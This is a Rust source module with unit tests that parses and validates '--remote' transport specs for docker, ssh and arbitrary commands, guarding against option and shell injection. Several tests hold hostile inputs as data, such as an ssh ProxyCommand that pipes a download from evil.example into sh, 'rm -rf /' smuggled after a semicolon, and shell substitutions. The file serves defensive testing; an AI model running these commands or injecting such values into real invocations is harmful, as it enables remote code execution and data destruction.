//! `--remote` spec parsing (#91): turns one `--remote <spec>` flag value
//! into a validated name and the [`Command`] [`RemoteSource::new`] spawns
//! and supervises.
//!
//! [`RemoteSource::new`]: crate::remote::source::RemoteSource::new
//!
//! Every function here is pure over its string input — nothing is spawned
//! until [`to_command`]'s result reaches `RemoteSource::new`, so a bad spec
//! can be rejected before any process exists.
//!
//! **Provenance invariant**: a spec string handed to [`parse_spec`] comes
//! ONLY from the user's own CLI invocation (and, later, their own config
//! file) — never from anything a remote itself said (a `Hello` hostname, a
//! session title, `docker ps` output). The auto-discovery ticket (#92) is
//! the single sanctioned exception, and it is expected to validate names
//! with [`validate_name`] directly rather than build spec strings and feed
//! them back through this parser.
//!
//! **Injection safety**: a container or host name becomes one argv element
//! via [`std::process::Command::arg`], never shell text — nothing here ever
//! passes a string through `sh -c`, including `cmd:`'s own argv, which is
//! split by [`split_argv`] and spawned literally. The one guard an argv
//! boundary doesn't give for free is SSH's/docker's own flag syntax: a name
//! beginning with `-` would be read as an *option* rather than a positional
//! argument (`ssh -oProxyCommand=evil` runs `evil` on the host, not on any
//! remote), so [`validate_name`] rejects that, and a conservative charset
//! besides, before a `Command` is ever built.

use std::fmt;
use std::process::Command;

/// `hermon agent`'s argv0 at the far end of a `docker:`/`ssh:` transport —
/// found on the remote's `PATH`, never a path the host resolves itself.
const AGENT_BIN: &str = "hermon";

/// One `--remote` flag, parsed and validated but not yet spawned.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteSpec {
    /// The roster prefix this remote's keys carry (`job1/C:0f865f`).
    /// Defaults to the container/host string, overridable with a `:name`
    /// suffix.
    pub name: String,
    kind: Kind,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Kind {
    Docker { container: String },
    Ssh { host: String },
    Cmd { argv: Vec<String> },
}

/// A spec that failed to parse or validate; `Display` is the whole message,
/// meant to reach the user on stderr as-is.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SpecError(String);

impl fmt::Display for SpecError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for SpecError {}

/// Parses one `--remote` value: `docker:<container>[:name]`,
/// `ssh:<host>[:name]`, or `cmd:<argv…>`.
pub fn parse_spec(spec: &str) -> Result<RemoteSpec, SpecError> {
    let (kind, rest) = spec.split_once(':').ok_or_else(|| {
        SpecError(format!(
            "--remote {spec:?}: expected docker:<container>, ssh:<host>, or cmd:<argv...>"
        ))
    })?;
    match kind {
        "docker" => {
            let (container, name) = split_name_suffix(rest);
            validate_name(container).map_err(|e| SpecError(format!("--remote {spec:?}: {e}")))?;
            Ok(RemoteSpec {
                name: name.unwrap_or(container).to_string(),
                kind: Kind::Docker {
                    container: container.to_string(),
                },
            })
        }
        "ssh" => {
            let (host, name) = split_name_suffix(rest);
            validate_name(host).map_err(|e| SpecError(format!("--remote {spec:?}: {e}")))?;
            Ok(RemoteSpec {
                name: name.unwrap_or(host).to_string(),
                kind: Kind::Ssh {
                    host: host.to_string(),
                },
            })
        }
        "cmd" => {
            let argv =
                split_argv(rest).map_err(|e| SpecError(format!("--remote {spec:?}: {e}")))?;
            let Some(first) = argv.first() else {
                return Err(SpecError(format!(
                    "--remote {spec:?}: cmd: needs at least one word"
                )));
            };
            let name = first.rsplit('/').next().unwrap_or(first).to_string();
            Ok(RemoteSpec {
                name,
                kind: Kind::Cmd { argv },
            })
        }
        other => Err(SpecError(format!(
            "--remote {spec:?}: unknown transport {other:?} (want docker:, ssh:, or cmd:)"
        ))),
    }
}

/// Parses every `--remote` value and checks name uniqueness across all of
/// them — the "validated at startup" the issue asks for, so a typo or a
/// collision fails the run immediately rather than silently dropping a
/// remote later.
pub fn parse_specs(specs: &[String]) -> Result<Vec<RemoteSpec>, SpecError> {
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::with_capacity(specs.len());
    for spec in specs {
        let parsed = parse_spec(spec)?;
        if !seen.insert(parsed.name.clone()) {
            return Err(SpecError(format!(
                "--remote {spec:?}: duplicate remote name {:?}",
                parsed.name
            )));
        }
        out.push(parsed);
    }
    Ok(out)
}

/// Splits `container[:name]` / `host[:name]` on the first colon: everything
/// before is the container/host, everything after (if any) overrides the
/// default name.
fn split_name_suffix(rest: &str) -> (&str, Option<&str>) {
    rest.split_once(':')
        .map_or((rest, None), |(h, n)| (h, Some(n)))
}

/// Rejects a container or host name that could be read as an option by the
/// transport binary rather than a positional argument, and anything outside
/// a conservative charset (alphanumeric, `.`, `-`, `_`, `@`, `:` — the last
/// two only meaningful for an ssh `user@host`, harmless to allow everywhere
/// else since a name is always exactly one argv element, never shell text).
///
/// Exported so #92's docker-discovery ticket can run the identical check on
/// `docker ps` output before it ever becomes a `--remote` spec, without
/// spawning anything to do it.
pub fn validate_name(name: &str) -> Result<(), SpecError> {
    if name.is_empty() {
        return Err(SpecError("empty name".to_string()));
    }
    if name.starts_with('-') {
        return Err(SpecError(format!(
            "{name:?}: names cannot start with '-' (would be read as an option, \
             not a positional argument)"
        )));
    }
    if let Some(bad) = name
        .bytes()
        .find(|&b| !(b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b'@' | b':')))
    {
        return Err(SpecError(format!(
            "{name:?}: disallowed character {:?}",
            bad as char
        )));
    }
    Ok(())
}

/// Minimal shell-words-style splitting for `cmd:` specs and `--remote-flags`:
/// single/double quotes group a word, a backslash escapes the next
/// character, whitespace separates words. Deliberately not a shell: `$(…)`,
/// backticks, `;`, globs and variable references are never interpreted —
/// they survive as literal bytes inside one argv element, which is the
/// whole point of never spawning through `sh -c`.
pub fn split_argv(s: &str) -> Result<Vec<String>, SpecError> {
    let mut words = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut quote: Option<char> = None;
    let mut chars = s.chars();

    while let Some(c) = chars.next() {
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            ' ' | '\t' | '\n' => {
                if in_word {
                    words.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            '\'' | '"' => {
                quote = Some(c);
                in_word = true;
            }
            '\\' => {
                if let Some(next) = chars.next() {
                    cur.push(next);
                    in_word = true;
                }
            }
            _ => {
                cur.push(c);
                in_word = true;
            }
        }
    }
    if quote.is_some() {
        return Err(SpecError("unterminated quote".to_string()));
    }
    if in_word {
        words.push(cur);
    }
    Ok(words)
}

/// Builds the `Command` [`RemoteSource::new`] spawns and supervises for
/// this spec — the only place in this module that constructs a `Command`,
/// and it does not spawn one. `agent_flags` (`--remote-flags`, already
/// split) are appended after `hermon agent` for `docker:`/`ssh:` transports
/// so a remote whose stores live somewhere other than the image's defaults
/// can still be reached — one shared string for every remote on this
/// invocation, the simpler of the two syntaxes the issue considered over a
/// per-spec suffix. Ignored for `cmd:`, whose argv is already complete.
///
/// [`RemoteSource::new`]: crate::remote::source::RemoteSource::new
pub fn to_command(spec: &RemoteSpec, agent_flags: &[String]) -> Command {
    match &spec.kind {
        Kind::Docker { container } => {
            let mut cmd = Command::new("docker");
            cmd.args(["exec", "-i", container, AGENT_BIN, "agent"]);
            cmd.args(agent_flags);
            cmd
        }
        // BatchMode=yes: never fall back to an interactive password prompt,
        // so a remote with no key-based auth set up fails fast (and
        // reconnects/backs off like any other bad transport) instead of
        // hanging the supervisor thread on a prompt nobody can answer.
        Kind::Ssh { host } => {
            let mut cmd = Command::new("ssh");
            cmd.args(["-o", "BatchMode=yes", host, AGENT_BIN, "agent"]);
            cmd.args(agent_flags);
            cmd
        }
        Kind::Cmd { argv } => {
            let mut cmd = Command::new(&argv[0]);
            cmd.args(&argv[1..]);
            cmd
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args_of(cmd: &Command) -> Vec<String> {
        cmd.get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    // ------------------------------------------------------------- docker

    #[test]
    fn docker_spec_builds_docker_exec_argv() {
        let spec = parse_spec("docker:job1").expect("parses");
        assert_eq!(spec.name, "job1");
        let cmd = to_command(&spec, &[]);
        assert_eq!(cmd.get_program().to_string_lossy(), "docker");
        assert_eq!(args_of(&cmd), vec!["exec", "-i", "job1", "hermon", "agent"]);
    }

    #[test]
    fn docker_spec_name_suffix_overrides_the_default_name() {
        let spec = parse_spec("docker:job1:worker").expect("parses");
        assert_eq!(spec.name, "worker");
        let cmd = to_command(&spec, &[]);
        assert_eq!(
            args_of(&cmd),
            vec!["exec", "-i", "job1", "hermon", "agent"],
            "the container name, not the display name, is what docker sees"
        );
    }

    #[test]
    fn docker_spec_forwards_remote_flags_after_the_agent_subcommand() {
        let spec = parse_spec("docker:job1").expect("parses");
        let flags = split_argv("--claude-dir /work/.claude").expect("splits");
        let cmd = to_command(&spec, &flags);
        assert_eq!(
            args_of(&cmd),
            vec![
                "exec",
                "-i",
                "job1",
                "hermon",
                "agent",
                "--claude-dir",
                "/work/.claude"
            ]
        );
    }

    // ---------------------------------------------------------------- ssh

    #[test]
    fn ssh_spec_builds_batch_mode_ssh_argv() {
        let spec = parse_spec("ssh:buildbox").expect("parses");
        assert_eq!(spec.name, "buildbox");
        let cmd = to_command(&spec, &[]);
        assert_eq!(cmd.get_program().to_string_lossy(), "ssh");
        assert_eq!(
            args_of(&cmd),
            vec!["-o", "BatchMode=yes", "buildbox", "hermon", "agent"]
        );
    }

    #[test]
    fn ssh_spec_accepts_a_user_at_host() {
        let spec = parse_spec("ssh:deploy@buildbox").expect("parses");
        assert_eq!(spec.name, "deploy@buildbox");
        let cmd = to_command(&spec, &[]);
        assert!(args_of(&cmd).contains(&"deploy@buildbox".to_string()));
    }

    #[test]
    fn ssh_spec_name_suffix_overrides_the_default_name() {
        let spec = parse_spec("ssh:buildbox:ci").expect("parses");
        assert_eq!(spec.name, "ci");
        let cmd = to_command(&spec, &[]);
        assert!(args_of(&cmd).contains(&"buildbox".to_string()));
    }

    // ---------------------------------------------------------------- cmd

    #[test]
    fn cmd_spec_splits_argv_and_spawns_it_directly() {
        let spec = parse_spec("cmd:podman exec -i job1 hermon agent").expect("parses");
        assert_eq!(spec.name, "podman");
        let cmd = to_command(&spec, &[]);
        assert_eq!(cmd.get_program().to_string_lossy(), "podman");
        assert_eq!(args_of(&cmd), vec!["exec", "-i", "job1", "hermon", "agent"]);
    }

    #[test]
    fn cmd_spec_ignores_remote_flags() {
        let spec = parse_spec("cmd:podman exec -i job1 hermon agent").expect("parses");
        let flags = vec!["--claude-dir".to_string(), "/work".to_string()];
        let cmd = to_command(&spec, &flags);
        assert_eq!(
            args_of(&cmd),
            vec!["exec", "-i", "job1", "hermon", "agent"],
            "cmd:'s argv is already complete"
        );
    }

    #[test]
    fn cmd_spec_with_quoted_words_keeps_them_as_one_argument() {
        let spec = parse_spec(r#"cmd:kubectl exec -i job1 -- hermon agent --title "my box""#)
            .expect("parses");
        let cmd = to_command(&spec, &[]);
        assert_eq!(
            args_of(&cmd).last(),
            Some(&"my box".to_string()),
            "the quoted words became one argv element"
        );
    }

    #[test]
    fn an_empty_cmd_spec_is_rejected() {
        let err = parse_spec("cmd:").unwrap_err();
        assert!(err.to_string().contains("at least one word"), "{err}");
    }

    // ------------------------------------------------------- injection safety

    #[test]
    fn a_leading_dash_ssh_host_is_rejected() {
        let err = parse_spec("ssh:-oProxyCommand=curl evil.example|sh").unwrap_err();
        assert!(err.to_string().contains("cannot start with '-'"), "{err}");
    }

    #[test]
    fn a_dash_f_ssh_host_is_rejected() {
        let err = parse_spec("ssh:-F/path/to/evil/config").unwrap_err();
        assert!(err.to_string().contains("cannot start with '-'"), "{err}");
    }

    #[test]
    fn a_host_that_is_only_a_dash_is_rejected() {
        let err = parse_spec("ssh:-").unwrap_err();
        assert!(err.to_string().contains("cannot start with '-'"), "{err}");
    }

    #[test]
    fn a_leading_dash_docker_container_is_rejected() {
        let err = parse_spec("docker:-oProxyCommand=evil").unwrap_err();
        assert!(err.to_string().contains("cannot start with '-'"), "{err}");
    }

    #[test]
    fn a_name_with_a_semicolon_is_rejected() {
        let err = parse_spec("docker:job;rm -rf /").unwrap_err();
        assert!(err.to_string().contains("disallowed character"), "{err}");
    }

    #[test]
    fn a_name_with_a_space_is_rejected() {
        let err = parse_spec("ssh:build box").unwrap_err();
        assert!(err.to_string().contains("disallowed character"), "{err}");
    }

    #[test]
    fn a_colon_in_the_ssh_host_position_becomes_a_name_suffix_not_a_second_host() {
        // The name suffix never reaches argv (only `host` does), so even a
        // hostile-looking suffix here is inert — it can only ever change
        // the roster's display prefix.
        let spec = parse_spec("ssh:buildbox:-oProxyCommand=evil").expect("parses");
        assert_eq!(spec.name, "-oProxyCommand=evil");
        let cmd = to_command(&spec, &[]);
        assert_eq!(
            args_of(&cmd),
            vec!["-o", "BatchMode=yes", "buildbox", "hermon", "agent"],
            "the name suffix never reaches the child's argv"
        );
    }

    #[test]
    fn an_empty_ssh_host_is_rejected() {
        let err = parse_spec("ssh:").unwrap_err();
        assert!(err.to_string().contains("empty name"), "{err}");
    }

    #[test]
    fn a_shell_substitution_in_a_cmd_spec_reaches_the_child_as_literal_argv() {
        let spec = parse_spec("cmd:echo $(rm -rf /) `id` ; ls").expect("parses");
        let cmd = to_command(&spec, &[]);
        assert_eq!(cmd.get_program().to_string_lossy(), "echo");
        assert_eq!(
            args_of(&cmd),
            vec!["$(rm", "-rf", "/)", "`id`", ";", "ls"],
            "no shell ever sees this: every hostile token is just an argv word"
        );
    }

    #[test]
    fn validate_name_rejects_empty_leading_dash_and_bad_charset() {
        assert!(validate_name("job1").is_ok());
        assert!(validate_name("deploy@buildbox").is_ok());
        assert!(validate_name("").is_err());
        assert!(validate_name("-x").is_err());
        assert!(validate_name("job one").is_err());
    }

    // ------------------------------------------------------------- misc

    #[test]
    fn an_unknown_transport_is_rejected() {
        let err = parse_spec("podman:job1").unwrap_err();
        assert!(err.to_string().contains("unknown transport"), "{err}");
    }

    #[test]
    fn a_spec_with_no_colon_is_rejected() {
        let err = parse_spec("job1").unwrap_err();
        assert!(err.to_string().contains("expected docker:"), "{err}");
    }

    #[test]
    fn duplicate_remote_names_are_rejected() {
        let specs = vec!["docker:job1".to_string(), "ssh:job1".to_string()];
        let err = parse_specs(&specs).unwrap_err();
        assert!(err.to_string().contains("duplicate remote name"), "{err}");
    }

    #[test]
    fn distinct_remote_names_all_parse() {
        let specs = vec!["docker:job1".to_string(), "ssh:buildbox".to_string()];
        let parsed = parse_specs(&specs).expect("parses");
        assert_eq!(parsed.len(), 2);
    }

    #[test]
    fn remote_flags_split_like_a_shell_line_without_being_one() {
        let flags =
            split_argv("--claude-dir /work/.claude --hermes-db /work/state.db").expect("splits");
        assert_eq!(
            flags,
            vec![
                "--claude-dir",
                "/work/.claude",
                "--hermes-db",
                "/work/state.db"
            ]
        );
    }

    #[test]
    fn an_unterminated_quote_is_rejected() {
        assert!(split_argv("cmd 'unterminated").is_err());
    }
}
